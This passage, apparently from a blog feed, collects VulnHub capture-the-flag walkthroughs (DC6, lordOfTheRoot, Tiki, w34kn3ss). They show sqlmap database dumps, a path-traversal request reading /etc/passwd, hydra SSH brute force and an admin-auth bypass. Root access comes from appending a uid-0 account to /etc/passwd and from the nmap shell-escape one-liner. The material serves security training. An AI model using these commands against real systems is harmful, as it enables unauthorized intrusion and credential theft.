src="/posts/c574ee4/image-20230112093425003.png"></p><p>扫描到存在漏洞和可利用的数据库。</p><p>查看staff库：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">-r</span> search.txt <span class="token parameter variable">-D</span> Staff --dump-all <span class="token parameter variable">--batch</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>staff库有两个表：</p><p>Table: Users</p><p><img src="/posts/c574ee4/image-20230112094226531.png"></p><p>Table: StaffDetails</p><p><img src="/posts/c574ee4/image-20230112094258834.png"></p><p>查看users库：</p><pre class="line-numbers language-none"><code class="language-none">sqlmap -r search.txt -D users --dump-all --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>Table: UserDetails</p><p><img src="/posts/c574ee4/image-20230112094453335.png"></p><p>我们感兴趣的是admin用户，其password是一串hash密码，利用<a href="https://hashes.com/en/decrypt/hash">hash解析工具</a>尝试能否解析出明文。</p><p><img src="/posts/c574ee4/image-20230112094927247.png"></p><p>解析出密码为：<strong>transorbital1</strong></p><h2 id="2-本地文件包含漏洞（LFI）"><a href="#2-本地文件包含漏洞（LFI）" class="headerlink" title="2.本地文件包含漏洞（LFI）"></a>2.本地文件包含漏洞（LFI）</h2><p>用admin账户和密码登录网页：</p><p><img src="/posts/c574ee4/image-20230112095244035.png"></p><p>看到登录后页面存在“File does not exist”的错误提示，这表明此处引用了文件，这个文件不存在或者放置的路径错误。</p><p>说明用到了文件包含，可能存在LFI（Local File Inculde）漏洞。</p><p>测试是否存在漏洞，如果存在，可显示包含文件内容：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.71.156/welcome.php?file<span class="token operator">=</span><span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/<span class="token punctuation">..</span>/etc/passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/c574ee4/image-20230112101929042.png"></p><p>显示出文件内容，表明存在LFI漏洞，枚举文件发现knockd.conf。因为在nmap扫描时发现了22过滤端口，knock敲门端口可做到这一点，所以这个文件应该就是过滤端口的配置文件。</p><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.71.156&#x2F;welcome.php?file&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;knockd.conf<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/c574ee4/image-20230112111457346.png"></p><p>看到 [openSSH] sequence &#x3D; 7469,8475,9842，则向靶机这三个端口发送syn包可以打开22端口。</p><pre class="line-numbers language-none"><code class="language-none">knock 192.168.71.156 7469 8475 9842<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再次用nmap扫描：</p><p><img src="/posts/c574ee4/image-20230112111913112.png"></p><p>发现22端口已开启。</p><h2 id="3-Hydra暴力破解"><a href="#3-Hydra暴力破解" class="headerlink" title="3.Hydra暴力破解"></a>3.Hydra暴力破解</h2><p>ssh端口开放后，尝试连接靶机。利用admin的账户登录没有成功，所以回到sqlmap dump的UserDetails表，分别将username字段和password字段内容生成用户名和密码字典，然后利用hydra工具自动去验证哪些账密是可用的，也可以看作暴力破解。</p><p>user.txt</p><pre class="line-numbers language-none"><code class="language-none">marymjuliedfredfbarneyrtomcjerrymwilmafbettyrchandlerbjoeytachelgrossgmonicagphoebebscootsjanitorjanitor2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>passwd.txt</p><pre class="line-numbers language-none"><code class="language-none">3kfs86sfd468sfdfsd24sfd87sfd1TC&amp;TheBoyzB8m#48sdPebblesBamBam01UrAG0D!Passw0rdyN72#dsdILoveRachel3248dsds7ssmellycatsYR3BVxxxw87IlovepeepeeHawaii-Five-0<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>用hydra进行暴力破解：</p><pre class="line-numbers language-none"><code class="language-none">hydra -L user.txt -P passwd.txt 192.168.71.156 ssh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功验证了3个账密信息：</p><p><img src="/posts/c574ee4/image-20230112120825444.png"></p><p>用以上账号ssh连接靶机，在janitor用户的文件夹中发现新的密码文件：</p><p><img src="/posts/c574ee4/image-20230112150723156.png"></p><p>将这些密码加入到passwd.txt，继续爆破。</p><p>发现多了一个新的账号被爆破出来：</p><p><img src="/posts/c574ee4/image-20230112154910240.png"></p><h2 id="4-修改passwd文件提权"><a href="#4-修改passwd文件提权" class="headerlink" title="4.修改passwd文件提权"></a>4.修改passwd文件提权</h2><p>登录fredf账户，查看sudo列表：</p><p><img src="/posts/c574ee4/image-20230112160104025.png"></p><p>看到fredf有权限执行root的文件test。</p><p>查看这个文件所在目录，在&#x2F;opt&#x2F;devstuff目录发现了该文件的源码文件，这个文件是由python文件编译成的。</p><p><img src="/posts/c574ee4/image-20230112160832055.png"></p><p>这个程序的作用是读取一个文件的内容，写到另一个文件里面去。这样的话就可以利用这个程序，以root身份修改&#x2F;etc&#x2F;passwd文件，添加一个和root拥有同样权限的用户，这样即使不知道root用户密码也可以提权至root。</p><p>passwd的文件中root用户的信息结构：</p><p><img src="/posts/c574ee4/image-20230112161531393.png"></p><p>把用户名和密码处修改为新用户，其它不变即可。</p><p>首先利用openssl获取summerone用户密码hash：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">openssl <span class="token function">passwd</span> <span class="token parameter variable">-1</span> <span class="token parameter variable">-salt</span> summerone <span class="token number">123456</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/c574ee4/image-20230112161906286.png"></p><p>创建&#x2F;tmp&#x2F;summerone文件，写入待填入passwd的内容：</p><pre class="line-numbers language-none"><code class="language-none">echo &#39;summerone:$1$summeron$hS0VqLZyefgRlknoJB9Kd1:0:0::&#x2F;root:&#x2F;bin&#x2F;bash&#39; &gt;&gt;&#x2F;tmp&#x2F;summerone<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>将summerone用户信息添加到passwd文件：</p><pre class="line-numbers language-none"><code class="language-none">sudo .&#x2F;test &#x2F;tmp&#x2F;summerone &#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看passwd文件，发现summerone用户已经写入了。</p><p>运行su summerone，输入密码123456，成功提权至root。</p><p><img src="/posts/c574ee4/image-20230112162842765.png"></p><p>获取到flag：</p><p><img src="/posts/c574ee4/image-20230112163033331.png"></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>这个靶机很有趣，第一次遇到了过滤状态的端口，并通过漏洞利用找到了打开过滤的方法。</p><p>靶机主要考察以下知识点：</p><ul><li>表单SQL注入漏洞；</li><li>LFI本地文件包含漏洞——枚举靶机文件；</li><li>Hydra利用泄露的用户和密码数据进行爆破；</li><li>利用修改passwd文件提权。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DC6：WordPress漏洞利用和nmap提权</title>
      <link href="/posts/c80c01fc.html"/>
      <url>/posts/c80c01fc.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/dc-6%2C315/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>nmap扫描端口：</p><p><img src="/posts/c80c01fc/image-20221230154617816.png"></p><p>访问80端口，根据靶机下载页面提示，修改&#x2F;etc&#x2F;hosts文件：</p><p><img src="/posts/c80c01fc/image-20221230154809445.png"></p><p>是熟悉的wordpress页面</p><p><img src="/posts/c80c01fc/image-20221230155031541.png"></p><h2 id="2-WordPress枚举"><a href="#2-WordPress枚举" class="headerlink" title="2.WordPress枚举"></a>2.WordPress枚举</h2><p>利用wpscan工具，对WordPress进行扫描。</p><h3 id="用户枚举"><a href="#用户枚举" class="headerlink" title="用户枚举"></a>用户枚举</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://wordy/ <span class="token parameter variable">-e</span> u <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/c80c01fc/image-20221230160227669.png"></p><h3 id="密码爆破"><a href="#密码爆破" class="headerlink" title="密码爆破"></a>密码爆破</h3><p>靶机下载页提示了爆破字典，所以应该是需要爆破的。</p><p><img src="/posts/c80c01fc/image-20221230160356912.png"></p><p>生成字典：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /usr/share/wordlists/rockyou.txt <span class="token operator">|</span> <span class="token function">grep</span> k01 <span class="token operator">></span> passwords.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆破账户密码：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://wordy/ <span class="token parameter variable">--passwords</span> passwords.txt <span class="token parameter variable">--usernames</span> admin,graham,mark,sarah,jens<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>爆破成功：</p><p><img src="/posts/c80c01fc/image-20221230173342221.png"></p><p>用账密信息：mark &#x2F; helpdesk01 登录wordpress：</p><p><img src="/posts/c80c01fc/image-20221230174012614.png"></p><h2 id="3-WordPress插件漏洞利用"><a href="#3-WordPress插件漏洞利用" class="headerlink" title="3.WordPress插件漏洞利用"></a>3.WordPress插件漏洞利用</h2><p>使用了这个插件Activity monitor：</p><p><img src="/posts/c80c01fc/image-20230104114524727.png"></p><p>利用Activity monitor 的<a href="https://www.exploit-db.com/exploits/45274">exploit</a> ，用以下命令可以把exploit复制到当前目录（45274为exploit的id）：</p><pre class="line-numbers language-none"><code class="language-none">searchsploit -m 45274 <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/c80c01fc/image-20230104143544292.png"></p><p>修改该html文件：</p><p><img src="/posts/c80c01fc/image-20230104152910561.png"></p><p>然后打开html文件，在mark用户登录的前提下，点击按钮，得到反弹shell。</p><p><img src="/posts/c80c01fc/image-20230104153652349.png"></p><p><img src="/posts/c80c01fc/image-20230104153724623.png"></p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>当前的用户为www-data，查看&#x2F;home文件夹查看用户文件：</p><p><img src="/posts/c80c01fc/image-20230104154206662.png"></p><p>查看mark用户的stuff文件夹查看things-to-do.txt文件：</p><p><img src="/posts/c80c01fc/image-20230104154417265.png"></p><p>发现账密信息：graham - GSo7isUM1D4</p><p>用这个账密信息链接SSH：</p><p><img src="/posts/c80c01fc/image-20230104154656401.png"></p><p>当前为graham用户，查看sudo列表，发现可执行jens用户的backups.sh文件。</p><p><img src="/posts/c80c01fc/image-20230104155332938.png"></p><p>修改backups.sh文件：</p><p><img src="/posts/c80c01fc/image-20230104162014380.png"></p><p>用以下命令执行，提权到jens用户：</p><pre class="line-numbers language-none"><code class="language-none">sudo -u jens &#x2F;home&#x2F;jens&#x2F;backups.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/c80c01fc/image-20230104162124952.png"></p><p>然后查看该用户的sudo列表，发现nmap拥有root权限：</p><p><img src="/posts/c80c01fc/image-20230104162228817.png"></p><p><a href="https://gtfobins.github.io/gtfobins/nmap/">nmap shell 获取方法</a></p><pre class="line-numbers language-none"><code class="language-none">TF&#x3D;$(mktemp)echo &#39;os.execute(&quot;&#x2F;bin&#x2F;sh&quot;)&#39; &gt; $TFsudo nmap --script&#x3D;$TF<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/posts/c80c01fc/image-20230104163150059.png"></p><p>成功提权到root权限，获取到flag！</p><p><img src="/posts/c80c01fc/image-20230104163426179.png"></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>这个靶机主要考察以下知识点：</p><ul><li>WordPress应用的用户枚举和密码爆破，wpscan工具的使用；</li><li>WordPress插件漏洞利用；</li><li>nmap应用提权。</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>lordOfTheRoot：knock敲门端口</title>
      <link href="/posts/a97202c.html"/>
      <url>/posts/a97202c.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/lord-of-the-root-101,129/">靶机下载地址</a></p></blockquote><h2 id="1-Knock端口敲门"><a href="#1-Knock端口敲门" class="headerlink" title="1.Knock端口敲门"></a>1.Knock端口敲门</h2><p>用nmap扫描，只扫到了22端口开放。</p><p><img src="/posts/a97202c/image-20221227105052893.png"></p><p>这个情况还是很少见的啊，连接一下试试：</p><p><img src="/posts/a97202c/image-20221227105126893.png"></p><p>打印出来的信息提示靶机配置了<a href="https://github.com/jvinet/knock/">Knock</a> ，敲门端口为1,2,3. 这个应用根据我的理解，Knock类似于一个防火墙，例如通常状况下，它只开放22端口，只有检测到向指定端口发送“敲门包”，才会开放其它端口。</p><p>所以安装Knock，然后向靶机的1,2,3端口发送“敲门包”，即Knock客户端向服务器发送TCP SYN 数据包。然后再次用nmap扫描：</p><pre class="line-numbers language-none"><code class="language-none">knock 192.168.71.154 1 2 3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a97202c/image-20221227153722343.png"></p><p>扫出一个新的端口：1337</p><p><img src="/posts/a97202c/image-20221227153953239.png"></p><p>这个页面里只有一张图片，其它什么都没发现！</p><h2 id="2-测试常见目录"><a href="#2-测试常见目录" class="headerlink" title="2.测试常见目录"></a>2.测试常见目录</h2><p>我卡在这儿了，然后看别人的walkthrough，发现是要访问index.php。这个页面确实可以访问，可是我用各种目录扫描工具扫描半天，什么都没有扫出来。那我不看别人攻略的话我怎么知道啊？还是说我以后要手动尝试一下index.php?</p><p>后来我又查看了其它walkthrough，他们查看的是robots.txt,因为在渗透测试过程中，都要查看下robots.txt文件。（但我还是有个疑惑，为什么它没有被扫出来，因为配置了knock这种防火墙吗）</p><p>后来通过测试，只要在<a href="http://192.168.71.154:1337/">http://192.168.71.154:1337/</a> 后面随便输入几个字，就会返回这个这个页面，应该是靶机作者的一种策略设置。</p><p>总结就是：可以手动测试robots.txt，index.php等文件是否存在。</p><p><img src="/posts/a97202c/image-20221227173326583.png"></p><p>查看源码：</p><p><img src="/posts/a97202c/image-20221227173408585.png"></p><p>base64解码：</p><p><img src="/posts/a97202c/image-20221227173618270.png"></p><p>得到一串base64解密字符串，提示Closer，继续base64解码：</p><p><img src="/posts/a97202c/image-20221227173833422.png"></p><p>访问 <a href="http://192.168.71.154:1337/978345210/index.php">http://192.168.71.154:1337/978345210/index.php</a>  </p><p><img src="/posts/a97202c/image-20221227174310434.png"></p><h2 id="3-使用SQLmap"><a href="#3-使用SQLmap" class="headerlink" title="3.使用SQLmap"></a>3.使用SQLmap</h2><p>面对一个登录页，可以考虑是否存在sql注入漏洞，用sqlmap工具寻找注入点：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">--url</span> http://192.168.71.154:1337/978345210/index.php <span class="token parameter variable">--forms</span> <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">--batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a97202c/image-20221229141159630.png"></p><p>扫描到可利用的数据库，将Webapp数据库的Users表dump下来</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">sqlmap <span class="token parameter variable">--url</span> http://192.168.71.154:1337/978345210/index.php <span class="token parameter variable">--forms</span> <span class="token parameter variable">--dbs</span> <span class="token parameter variable">--level</span><span class="token operator">=</span><span class="token number">5</span> <span class="token parameter variable">--risk</span><span class="token operator">=</span><span class="token number">3</span> <span class="token parameter variable">-D</span> Webapp <span class="token parameter variable">-T</span> Users <span class="token parameter variable">--columns</span> <span class="token parameter variable">--dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/a97202c/image-20221229143505663.png"></p><p>利用用户名smeagol和密码MyPreciousR00t接入SSH</p><p><img src="/posts/a97202c/image-20221229143817884.png"></p><h2 id="4-提权"><a href="#4-提权" class="headerlink" title="4.提权"></a>4.提权</h2><p>根据靶机系统内核版本，查找可利用的<a href="https://www.exploit-db.com/exploits/39166">exploit</a>。</p><p><img src="/posts/a97202c/image-20221229163115877.png"></p><p>把exploit上传到靶机然后编译，执行后获得root权限。</p><p><img src="/posts/a97202c/image-20221229160037208.png"></p><p><img src="/posts/a97202c/image-20221229160116311.png"></p><p>获得root用户flag。</p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>阳后第一练，身体虚弱，这个靶机做得也挺难受的：</p><ul><li>knock端口敲门：第一次接触</li><li>sqlmap：OSCP不可以用这个不是吗？但是手动测试还不会，后面遇到再说吧</li><li>提权：又是内核版本漏洞提权</li></ul>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tiki：利用某CMS漏洞绕过管理员认证</title>
      <link href="/posts/1f7f1760.html"/>
      <url>/posts/1f7f1760.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/tiki-1,525/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>端口扫描：</p><p><img src="/posts/1f7f1760/image-20221215154014761.png"></p><p>端口信息及思路：</p><p>22: ssh OpenSSH 8.2p1 —— 公钥、私钥</p><p>80：http —— 源码找线索、目录扫描、功能点测试</p><p>139和455：samba —— enum4linux工具枚举</p><p>nmap扫描出了80端口的robots.txt文件，显示目录&#x2F;tiki&#x2F;，访问该目录：</p><p><img src="/posts/1f7f1760/image-20221215155207360.png"></p><p>这是一个名为tiki的CMS系统，看到CMS系统一般就想到想办法登录到管理员，然后注入反弹shell。</p><h2 id="2-枚举samba服务"><a href="#2-枚举samba服务" class="headerlink" title="2.枚举samba服务"></a>2.枚举samba服务</h2><p>那么查看一下samba吧，用enum4linux扫描靶机：</p><p><img src="/posts/1f7f1760/image-20221215160727536.png" alt="用户名为silky"></p><p>发现用户名：silky</p><p><img src="/posts/1f7f1760/image-20221215161905063.png"></p><p>samba share枚举中发现名为Notes的Share可以利用，尝试无用户名密码登录：</p><pre class="line-numbers language-none"><code class="language-none">smbclient -U &#39;&#39; &#x2F;&#x2F;192.168.71.153&#x2F;Notes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/posts/1f7f1760/image-20221215162058734.png"></p><p>连接成功！查看内容，Mail.txt文件中泄露了silky账户的CMS系统密码，还提示了CMS存在0 day漏洞。</p><p><img src="/posts/1f7f1760/image-20221215162310774.png"></p><p><img src="/posts/1f7f1760/image-20221215162410572.png"></p><h2 id="3-利用CMS漏洞绕过管理员认证"><a href="#3-利用CMS漏洞绕过管理员认证" class="headerlink" title="3.利用CMS漏洞绕过管理员认证"></a>3.利用CMS漏洞绕过管理员认证</h2><p>利用账号密码<strong>silyky:51lky571k1</strong>登录tiki CMS系统：</p><p><img src="/posts/1f7f1760/image-20221215172826439.png"></p><p>在Silkys Homepage 中写道，他发现了一个CVE漏洞，但是不知道编号。这又是在提示需要利用这个漏洞。我去exploit-db搜了“tiki”，显示漏洞很多不知道哪一个。后来发现可以点击“History”按钮查看编辑记录，这篇文档编辑记录很多，显然有猫腻。</p><p><img src="/posts/1f7f1760/image-20221215172851069.png"></p><p>终于在第二篇编辑记录里发现了CVE编号。</p><p><img src="/posts/1f7f1760/image-20221215172519403.png"></p><p>漏洞CVE号：<a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15906">CVE-2020-15906</a></p><p>漏洞描述：在Tiki 21.2 之前的 版本中，tiki-login.php 在 50 次无效登录尝试后将管理员密码设置为空值。</p><p><img src="/posts/1f7f1760/image-20221215173302912.png"></p><p>想到用burpsuite登录50次，把拦截的登录数据包发送到“Intruder”模块，payload设置在密码处，然后随便加50个密码，我这里是数字1-50，然后进行攻击。</p><p><img src="/posts/1f7f1760/image-20221215174711892.png" alt="拦截数据包发送到Intruder"></p><p><img src="/posts/1f7f1760/image-20221215174739143.png" alt="设置密码1-50"></p><p><img src="/posts/1f7f1760/image-20221215174813853.png" alt="数据包发送中"></p><p>攻击完成之后，再次登录会有以下提示：50次以上密码错误，账号已停用。</p><p><img src="/posts/1f7f1760/image-20221215175258277.png"></p><p>再次拦截登录数据包，把密码部分删除，即为“空”。</p><p><img src="/posts/1f7f1760/image-20221215181047736.png"></p><p>然后点击“Intercept is on”切换为off状态，放出修改后的数据包，页面跳转，以admin用户登录成功！</p><p><img src="/posts/1f7f1760/image-20221215181438990.png"></p><p>登录之后，这里找了半天反弹shell注入点，但是事实证明我想多了，在Wiki里面有一个“Credentials”页面，直接把账号密码写里面了！（-。-！）</p><p><img src="/posts/1f7f1760/image-20221216092138118.png"></p><p><img src="/posts/1f7f1760/image-20221215182233098.png"></p><h2 id="4-获取root权限"><a href="#4-获取root权限" class="headerlink" title="4.获取root权限"></a>4.获取root权限</h2><p>用账户密码<strong>silky:Agy8Y7SPJNXQzqA</strong>登录ssh：</p><p><img src="/posts/1f7f1760/image-20221216092425070.png"></p><p>连接成功！当前用户为silky，发现该用户拥有sudo权限：</p><p><img src="/posts/1f7f1760/image-20221216093100090.png"></p><p>用sudo su命令，输入silky的密码，提权到root用户成功！获取到flag。</p><p><img src="/posts/1f7f1760/image-20221216093131705.png"></p><h2 id="5-总结"><a href="#5-总结" class="headerlink" title="5.总结"></a>5.总结</h2><p>这个靶机是我没查别人的wp，完全靠自己做出来的第一个靶机。虽然简单吧，比如提权，可以说是完全没考察什么知识点，但是自己从头到尾做出来还是很开心的，怎么说呢，一个小菜鸟通过努力学习还是有进步哒！</p><p>这个靶机主要是考察对N day漏洞的利用能力，这个靶机提示了漏洞编号，很多是没有提示的，就是要靠自己对靶机应用的理解去筛选。</p><p>还有就是我把简单的问题想复杂了，看到CMS首先想到的是注入反弹shell，验证了好几个功能甚至还上传了shell.php文件，然后找不到触发点。但是这个靶机是把账密直接给你了，不然开22端口干嘛？直接反弹shell就好了啊！所以要综合考虑，大多数情况下，靶机的每个开放端口都不白给。</p>]]></content>
      
      
      <categories>
          
          <category> walkthrough </category>
          
      </categories>
      
      
        <tags>
            
            <tag> vulnhub </tag>
            
            <tag> oscp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>w34kn3ss：利用OpenSSL的漏洞通过公钥获取私钥</title>
      <link href="/posts/8ddd383c.html"/>
      <url>/posts/8ddd383c.html</url>
      
        <content type="html"><![CDATA[<blockquote><p><a href="https://www.vulnhub.com/entry/w34kn3ss-1,270/">靶机下载地址</a></p></blockquote><h2 id="1-信息收集"><a href="#1-信息收集" class="headerlink" title="1.信息收集"></a>1.信息收集</h2><p>扫描端口：</p><p><img src="/posts/8ddd383c/image-20221214155051395.png"></p><p>通过目录扫描找到了一个图片，在&#x2F;test&#x2F;目录下。</p><p><img src="/posts/8ddd383c/image-20221214155228018.png"></p><p>图片上写”需要很多keys“。</p><p>用图片解析工具查看，没有得到任何有用信息：</p><p><img src="/posts/8ddd383c/image-20221214160253922.png"></p><p>回看nmap扫描结果，443端口给出了一个签发证书的域名地址：<strong>weakness.jth</strong>。编辑&#x2F;etc</p><p>&#x2F;hosts文件，把域名加入。</p><p><img src="/posts/8ddd383c/image-20221214161024800.png"></p><p>然后访问：<a href="http://weakness.jth/">http://weakness.jth/</a></p><p><img src="/posts/8ddd383c/image-20221214161426335.png"></p><p>对该网页进行目录扫描，发现了一个新目录&#x2F;private</p><p><img src="/posts/8ddd383c/image-20221214161635467.png"></p><p>访问这个目录发现了两个文件：</p><p><img src="/posts/8ddd383c/image-20221214161853091.png"></p><p>第一个是mykey公钥，应该是用来登录ssh的。</p><p>第二个notes.txt的内容：</p><p><img src="/posts/8ddd383c/image-20221214162139051.png"></p><h2 id="2-利用openssl漏洞爆破私钥"><a href="#2-利用openssl漏洞爆破私钥" class="headerlink" title="2.利用openssl漏洞爆破私钥"></a>2.利用openssl漏洞爆破私钥</h2><p>notes.txt提示密钥是由openssl 0.9.8c-1生成的。特意提示了版本信息，那说明这个版本可能存在漏洞：</p><p><img src="/posts/8ddd383c/image-20221214165443576.png"></p><p>注意到5720.py是一个暴力破解的脚本，把它复制过来：</p><p><img src="/posts/8ddd383c/image-20221214165728660.png"></p><p>这个exploits里注明了漏洞利用方法：</p><p><img src="/posts/8ddd383c/image-20221214170213399.png"></p><p>先下载文件<a href="https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/5622.tar.bz2">debian_ssh_rsa_2048_x86.tar.bz2</a></p><p>然后把它解压在一个目录下，查看文件内容，这应该是一个个公钥和私钥对。</p><p><img src="/posts/8ddd383c/image-20221215102204998.png"></p><p>我们已经得到了mykey.pub文件，接下来就是找到与它配对的私钥。</p><p><img src="/posts/8ddd383c/image-20221215103331487.png"></p><p>在文件夹中找到了内容一致的公钥，它的同名文件即对应的私钥：<strong>4161de56829de2fe64b9055711f531c1-2537</strong></p><p>现在有私钥了，那用户名呢？回看<a href="http://weakness.jth/">http://weakness.jth/</a>  的那只兔子，用户名为n30，隐藏在兔子里。</p><p><img src="/posts/8ddd383c/image-20221215103719609.png"></p><p>现在可以用以下命令连接ssh：</p><pre class="line-numbers language-none"><code class="language-none">ssh -i 4161de56829de2fe64b9055711f531c1-2537 n30@weakness.jth<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>连接成功！</p><p><img src="/posts/8ddd383c/image-20221215104453574.png"></p><h2 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h2><p>目前用户为n30.获取user.txt</p><p><img src="/posts/8ddd383c/image-20221215104736140.png"></p><p>发现了一个名字很敏感的文件：code</p><p>查看了一下，是python编译的文件。</p><p><img src="/posts/8ddd383c/image-20221215105543363.png"></p><p>执行文件运行出现错误，但是输出了敏感信息：登录硬编码？</p><p><img src="/posts/8ddd383c/image-20221215105809350.png"></p><p>把这个文件下载到kali进行反编译，查看程序代码中是否有硬编码的登录信息：</p><p><img src="/posts/8ddd383c/image-20221215110106579.png"></p><p>把code移动到下载公钥的那个文件夹，或者用python开一个http服务都可以。</p><p>下载：</p><p><img src="/posts/8ddd383c/image-20221215110250332.png"></p><p>把code文件重新命名为code.pyc文件，上传到<a href="https://tool.lu/pyc/">在线python反编译工具</a> ：</p><p>反编译的代码：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># visit https://tool.lu/pyc/ for more information</span><span class="token comment"># Version: Python 2.7</span><span class="token keyword">import</span> os<span class="token keyword">import</span> socket<span class="token keyword">import</span> time<span class="token keyword">import</span> hashlib<span class="token keyword">print</span> <span class="token string">'[+]System Started at : &#123;0&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>time<span class="token punctuation">.</span>ctime<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">print</span> <span class="token string">'[+]This binary should generate unique hash for the hardcoded login info'</span><span class="token keyword">print</span> <span class="token string">'[+]Generating the hash ..'</span>inf <span class="token operator">=</span> <span class="token string">''</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'n'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'3'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'0'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">':'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'d'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'M'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>inf <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span><span class="token string">'A'</span><span class="token punctuation">)</span><span class="token 